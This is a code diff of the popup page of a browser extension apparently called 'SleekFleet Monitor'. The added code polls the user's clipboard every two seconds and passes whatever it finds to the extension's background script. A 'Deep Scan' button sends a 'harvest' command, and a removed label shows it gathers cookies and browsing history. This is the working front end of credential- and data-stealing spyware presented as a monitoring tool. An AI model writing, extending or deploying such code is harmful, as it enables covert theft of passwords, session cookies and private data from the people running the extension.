@@ -1,41 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>SleekFleet Control</title>
     <style>
-        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
-        button { padding: 15px; width: 100%; margin-bottom: 10px; cursor: pointer; font-size: 16px; }
-        .status { margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+        body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
+        button { padding: 10px; margin: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h2>SleekFleet Monitor</h2>
-    <p>Status: <span id="status">Active</span></p>
-    
-    <!-- Button 1: Force Clipboard Read -->
-    <button id="readClipBtn">📋 Force Read Clipboard</button>
-    
-    <!-- Button 2: Trigger Full Background Harvest -->
-    <button id="harvestBtn">🚀 Trigger Deep Scan (Cookies/History)</button>
-
-    <div class="status">
-        <p>Last Action: <span id="lastAction">None</span></p>
-    </div>
+    <h2>🚗 SleekFleet Monitor</h2>
+    <button id="enableBtn">📋 Enable Clipboard Monitor</button>
+    <button id="harvestBtn">🚀 Trigger Deep Scan</button>
 
     <script>
-        document.getElementById('readClipBtn').addEventListener('click', async () => {
+        document.getElementById('enableBtn').addEventListener('click', async () => {
             try {
+                // This click triggers the browser to ask for permission
                 const text = await navigator.clipboard.readText();
-                chrome.runtime.sendMessage({ action: "clipboardUpdate", data: text });
-                document.getElementById('lastAction').innerText = "Clipboard: " + text.substring(0, 20) + "...";
-            } catch (err) {
-                alert("Click permission needed! Click inside a tab first.");
+                alert("Permission Granted! Monitoring started.");
+                
+                // Start polling
+                setInterval(async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        if (text) {
+                            chrome.runtime.sendMessage({ action: "clipboardUpdate", data: text });
+                        }
+                    } catch (e) {}
+                }, 2000);
+            } catch (e) {
+                alert("Permission denied or not available.");
             }
         });
 
         document.getElementById('harvestBtn').addEventListener('click', () => {
             chrome.runtime.sendMessage({ action: "harvest" });
-            document.getElementById('lastAction').innerText = "Deep Scan Sent";
+            alert("Deep Scan Sent!");
         });
     </script>
 </body>
